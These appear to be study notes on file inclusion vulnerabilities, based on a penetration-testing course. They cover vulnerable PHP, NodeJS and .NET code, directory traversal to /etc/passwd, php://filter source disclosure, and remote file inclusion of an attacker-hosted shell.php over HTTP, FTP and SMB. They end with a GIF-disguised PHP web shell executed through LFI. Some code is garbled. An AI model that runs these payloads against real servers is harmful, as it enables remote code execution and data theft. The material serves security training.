Extra read: `https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters`

# Exploit-ability of LFI
LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions. Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.
## Examples of Vulnerable Code
mentioned earlier, file Inclusion vulnerabilities can occur in many of the most popular web servers and development frameworks, like `PHP`, `NodeJS`, `Java`, `.Net`, and many others. Each of them has a slightly different approach to including local files, but they all share one common thing: loading a file from a specified path.

the page may have a `?language` GET parameter, and if a user changes the language from a drop-down menu, then the same page would be returned but with a different `language` parameter (e.g. `?language=es`). In such cases, changing the language may change the directory the web application is loading the pages from (e.g. `/en/` or `/es/`). If we have control over the path being loaded, then we may be able to exploit this vulnerability to read other files and potentially reach remote code execution.

#### PHP

In `PHP`, we may use the `include()` function to load a local or a remote file as we load a page. If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and `the code does not explicitly filter and sanitize the user input`, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

this is not strictly tied to include, other functions of php are:
include `include_once()`, `require()`, `require_once()`, `file_get_contents()`, and several others as well.

# NodeJS
 ```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
The following example shows how the `language` parameter is used to determine which directory to pull the `about.html` page from:

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
# .Net sample
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Finally, the `include` function may be used to render local files or remote URLs, and may also execute the specified files as well:


```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

![](Pasted%20image%2020250429175202.png)![](Pasted%20image%2020250429175232.png)
if we had access to the source code in a whitebox exercise or in a code audit, knowing these actions helps us in identifying potential File Inclusion vulnerabilities, especially if they had user-controlled input going into them.

In all cases, File Inclusion vulnerabilities are critical and may eventually lead to compromising the entire back-end server. Even if we were only able to read the web application source code, it may still allow us to compromise the web application, as it may reveal other vulnerabilities as mentioned earlier, and the source code may also contain database keys, admin credentials, or other sensitive information.

#  basic LFI
Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows. So, let's change the parameter from `es` to `/etc/passwd`:

`language` parameter may be used for the filename, and may be added after a directory, as follows:

```php
include("./languages/" . $_GET['language']);
```

In this case, if we attempt to read `/etc/passwd`, then the path passed to `include()` would be (`./languages//etc/passwd`), and as this file does not exist, we will not be able to read anything

We can easily bypass this restriction by traversing directories using `relative paths`. To do so, we can add `../` before our file name, which refers to the parent directory. For example, if the full path of the languages directory is `/var/www/html/languages/`, then using `../index.php` would refer to the `index.php` file on the parent directory (i.e. `/var/www/html/index.php`).

So, we can use this trick to go back several directories until we reach the root path (i.e. `/`), and then specify our absolute file path (e.g. `../../../../etc/passwd`), and the file should exist: 

**Tip:** It can always be useful to be efficient and not add unnecessary `../` several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of `../` that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with `/var/www/html/` we are `3` directories away from the root path, so we can use `../` 3 times (i.e. `../../../`).\

## Filename Prefix
On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:
```php
include("lang_" . $_GET['language']);
```

In this case, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid

we can prefix a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories:
```
**Note:** This may not always work, as in this example a directory named `lang_/` may not exist, so our relative path may not be correct. Furthermore, `any prefix appended to our input may break some file inclusion techniques` we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.
```

## Appended Extensions
```php
includsearche($_GET['language'] . ".php");
```
## Second-Order Attacks

### POISONING DB ENTRIES
For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a `Second-Order` attack.

Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a `?page` parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.

Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.

# php filters


### php wrappers
![[Pasted image 20250430154948.png]]
### Think of it like this:

You're using one command:
```
file_get_contents("X");
```
But depending on what "X" starts with:

- `"file://"` → read local file
    
- `"http://"` or `"https://"` → download webpage
    
- `"php://input"` → read raw POST data
    
- `"ftp://"` → access FTP server
    

PHP knows which **wrapper** to use, and it "wraps" the logic behind the scenes.
In this section, we will see how basic PHP filters are used to read PHP source code, and in the next section, we will see how different PHP wrappers can help us in gaining remote code execution through LFI vulnerabilities.

To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.
The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).  the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

# reading source code
Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

Even after reading the sources of any identified files, we can `scan them for other referenced PHP files`, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading `index.php` and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.

---

## Standard PHP Inclusion

In previous sections, if you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page. For example, let's try to include the `config.php` page (`.php` extension appended by web application):

![Shipping containers and cranes at a port.](https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png)

As we can see, we get an empty result in place of our LFI string, since the `config.php` most likely only sets up the web app configuration and does not render any HTML output.
**Note:** The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.

This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where the `base64` php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only, as discussed in the previous section.

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter. Let's try to read the source code of `config.php` using the base64 filter, by specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource` parameter, as follows:

# RFI
in some cases, we may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host
![](Pasted%20image%2020250502035546.png)
an LFI may not necessarily be an RFI. This is primarily because of three reasons:

3. The vulnerable function may not allow including remote URLs
4. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
5. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
VERIFY RFI
```shell-session
$ echo 'W1BIUF0KCjs7Ozs<BASE64-CONFIG>5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

2- Start by including local files  to the server `http://127.0.0.1:80/index.php`)
`http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
Now, we can start a server on our machine with a basic python server with the following command, as follows:

```shell-session
sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
**Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

ftp
This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:
```shell-session
sudo python -m pyftpdlib -p 21

http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

## SMB

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include`
```shell-session
impacket-smbserver -smb2support share $(pwd)
```
```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

# accessing uploaded webshell through LFI
If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

![](Pasted%20image%2020250502041833.png)
#### Crafting Malicious Image
```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

**Note: We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module goes more in depth for file type attacks, and the same logic can be applied here.**
![Profile image upload interface with a successful upload message.](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)
#### Uploaded File Path

 To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```
**Note: As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.**
`http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
N**ote:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.
